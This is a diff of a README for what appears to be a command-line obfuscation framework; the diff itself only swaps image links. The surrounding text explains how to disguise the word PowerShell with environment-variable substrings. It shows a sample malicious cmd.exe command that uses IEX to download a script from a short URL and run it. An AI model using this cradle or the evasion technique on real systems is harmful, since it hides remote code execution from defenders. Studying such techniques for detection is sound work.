@@ -54,14 +54,14 @@ The framework provides 3 main obfuscation options:
 
 ### BINARY
 One way to obfuscate the string PowerShell in the example command is to substitute individual characters with substrings of existing environment variable values. For example, executing the internal command ```set``` displays all environment variable name and value pairs.<br>
-![bin ex 1](https://ibb.co/d43Jh7H)<br>
+![binex 1](https://i.ibb.co/0yWVwQz/image.png)<br>
 The ```ALLUSERSPROFILE``` environment variable contains the character ```r``` at the 4th and 7th indexes. These single characters can be retrieved using cmd.exe’s native substring functionality: ```%ALLUSERSPROFILE:~4,1%``` or ```%ALLUSERSPROFILE:~7,1%```.<br>
-![bin ex 2](https://ibb.co/HHgR7y5)<br>
+![binex 2](https://i.ibb.co/crTRJ94/image.png)<br>
 Substituting the character ```r``` in PowerShell produces: ```Powe%ALLUSERSPROFILE:~4,1%Shell```. Adding this obfuscation back into the sample malicious command results in:
 ```CMD
 cmd.exe /c “Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/L3g1t’)”
 ```
-![bin ex 3](https://ibb.co/WHmQM1b)
+![binex 3](https://i.ibb.co/HK50bQW/image.png)
 
 ### ENCODING
 
